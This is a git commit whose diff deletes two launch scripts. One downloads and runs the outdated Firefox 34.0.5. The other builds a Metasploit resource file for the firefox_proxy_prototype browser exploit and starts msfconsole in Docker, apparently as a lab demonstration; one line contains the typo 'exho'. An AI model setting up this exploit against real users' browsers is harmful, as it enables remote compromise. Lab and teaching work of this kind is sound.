3aaaa2ee3768bb041c7e63a2662e4cd31443b7bb
cabrerap <pablo.cabrera@grenoble-inp.org>
2018-01-23 11:34:41 +0100

    fusion des scripts de lancement et description de l'utilisation

--- firefox.sh
+++
@@ -1,4 +0,0 @@
-rm -rf firefox-34.0.5.tar.bz2 firefox
-wget https://ftp.mozilla.org/pub/firefox/releases/34.0.5/linux-x86_64/en-GB/firefox-34.0.5.tar.bz2
-tar xvf firefox-34.0.5.tar.bz2 firefox
-./firefox/firefox -no-remote &
--- metasploit.sh
+++
@@ -1,6 +0,0 @@
-mkdir /tmp/msf
-echo use exploit/multi/browser/firefox_proxy_prototype > run.rc
-echo set URIPATH exploit >> run.rc
-exho exploit >> run.rc
-
-docker rm -f msf && docker run -i -t -p 9990-9999:9990-9999 -v /tmp/msf:/tmp/data --name msf phocean/msf msfconsole -r /tmp/data/run.rc
